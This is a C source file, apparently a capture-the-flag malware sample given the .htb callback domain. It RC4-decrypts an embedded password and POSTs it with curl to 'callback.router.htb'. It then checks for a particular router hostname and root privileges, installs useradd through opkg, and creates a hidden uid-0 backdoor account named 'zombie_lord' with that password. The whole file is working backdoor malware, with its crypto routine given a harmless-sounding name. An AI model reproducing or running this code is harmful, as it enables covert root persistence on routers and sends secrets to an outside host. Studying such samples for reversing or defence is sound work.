#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <curl/curl.h>
#include <sys/types.h>
#include <pwd.h>


#define N 256   // 2^8

void swap(unsigned char* a, unsigned char* b) {
    int tmp = *a;
    *a = *b;
    *b = tmp;
}

int key_rounds_init(char* key, unsigned char* S) {

    int len = strlen(key);
    int j = 0;

    for (int i = 0; i < N; i++)
        S[i] = i;

    for (int i = 0; i < N; i++) {
        j = (j + S[i] + key[i % len]) % N;

        swap(&S[i], &S[j]);
    }

    return 0;
}

int perform_rounds(unsigned char* S, char* plaintext, unsigned char* ciphertext) {

    int i = 0;
    int j = 0;

    for (size_t n = 0, len = strlen(plaintext); n < len; n++) {
        i = (i + 1) % N;
        j = (j + S[i]) % N;

        swap(&S[i], &S[j]);
        int rnd = S[(S[i] + S[j]) % N];

        ciphertext[n] = rnd ^ plaintext[n];

    }

    return 0;
}

int init_crypto_lib(char* key, char* plaintext, unsigned char* ciphertext) {

    unsigned char S[N];
    key_rounds_init(key, S);

    perform_rounds(S, plaintext, ciphertext);

    return 0;
}


int main() {
    char user[] = "zombie_lord";
    char key[] = "d2c0ba035fe58753c648066d76fa793bea92ef29";
    char password[] = { 0xc5,0x7c,0x2b,0x05,0x48,0x90,0xf3,0xb7,0x3f,0x76,0x0f,0x5b,0x68,0x7b,0x62,0x72,0xbd,0xf8,0x01,0x9b,0x57,0x47,0x1e,0x6f,0xdf,0x8c,0x55 };

    unsigned char* pw = malloc(sizeof(int) * strlen(password));

    init_crypto_lib(key, password, pw);

    CURL* curl = curl_easy_init();
    if (!curl) return -2;

    curl_easy_setopt(curl, CURLOPT_URL, "http://callback.router.htb");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, pw);
    curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    FILE* hostname = fopen("/proc/sys/kernel/hostname", "r");
    char hostname_str[256] = { 0 };
    int hlen = fread(hostname_str, 256, 1, hostname);
    fclose(hostname);
    hostname_str[hlen - 1] = '\0';

    if (strncmp(hostname_str, "HSTERUNI-GW-01", 15) != 0) return -1;

    if (getuid() != 0 && geteuid() != 0) return -1;

    struct passwd* u_pw = getpwnam(user);

    if (u_pw == NULL) {
        system("opkg update && opkg install shadow-useradd && useradd -s /bin/ash -g 0 -u 0 -o -M zombie_lord");
    }

    FILE* chpw = popen("passwd zombie_lord", "w");
    fprintf(chpw, "%s\n%s\n", pw, pw);
    pclose(chpw);

    return 0;
}
